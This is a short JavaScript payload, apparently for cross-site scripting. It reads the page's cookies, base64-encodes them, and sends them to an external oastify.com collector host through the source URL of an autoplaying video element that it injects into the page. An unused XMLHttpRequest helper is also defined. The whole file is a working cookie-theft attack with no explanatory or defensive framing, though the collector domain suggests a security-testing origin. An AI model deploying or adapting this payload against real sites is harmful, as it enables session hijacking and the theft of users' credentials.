function httpGet(theUrl)
{
    let xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, true );
    xmlHttp.send( null );
}
let cookies = document.cookie;
let encoded = encodeURIComponent(btoa(cookies));
let target = "https://t938f64qxb91g56ufazgnckv3m9cx1.oastify.com/?cookie=".concat(encoded);

let vidElem = document.createElement("video");
vidElem.setAttribute("width", "320");
vidElem.setAttribute("height", "240");
vidElem.setAttribute("autoplay", "autoplay");
let sourceElement = document.createElement("source");
sourceElement.setAttribute("src", target);
sourceElement.setAttribute("type", "video/mp4");
vidElem.appendChild(sourceElement);
document.body.appendChild(vidElem);